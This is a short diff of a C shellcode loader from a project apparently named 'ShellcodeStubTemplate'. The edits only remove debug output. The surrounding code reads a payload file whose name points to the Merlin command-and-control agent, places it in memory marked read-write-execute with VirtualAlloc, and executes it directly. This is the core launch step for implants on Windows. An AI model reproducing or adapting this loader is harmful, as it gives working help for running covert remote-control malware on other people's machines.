@@ -35,7 +35,6 @@ void print_hex(const char *string)
 int main(int argc, char **argv) {
 
  
-unsigned char abc[256]="";
 const char* filename = "C:\\Users\\Antoine\\source\\repos\\ShellcodeStubTemplate\\enc_merlin1705";
 
 FILE* in_file = fopen(filename, "rb");
@@ -58,12 +57,10 @@ FILE* in_file = fopen(filename, "rb");
  
     fclose(in_file);
 
-printf("for debug1");
 void *exec = VirtualAlloc(0, sb.st_size+100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-printf("for debug2");
 memcpy(exec, file_contents, sb.st_size);
 
-printf("for debug3");
+printf("for debug");
 ((void(*)())exec)();
 return 0;
 
